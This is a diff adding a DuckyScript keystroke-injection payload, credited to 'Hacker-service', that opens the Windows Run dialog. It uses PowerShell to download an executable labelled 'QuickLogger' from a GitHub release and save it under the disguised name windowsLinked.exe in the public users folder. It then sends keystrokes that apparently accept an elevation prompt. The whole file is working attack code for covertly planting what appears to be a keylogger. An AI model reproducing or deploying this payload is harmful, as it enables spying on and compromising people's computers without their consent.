@@ -1,0 +1,15 @@
+REM Arthur: Hacker-service
+REM Description: Downloads a QuickLogger EXE file, places it in a secure location and opens it only using Win + R
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell -c Invoke-WebRequest -Uri "https://github.com/WilleLX1/F0_BK/releases/download/Quick-Logger/V1.0.0.exe" -OutFile "C:\users\public\windowsLinked.exe"
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1500
+LEFT
+DELAY 500
+SPACE
+DELAY 500
+ENTER
+REM DONE!
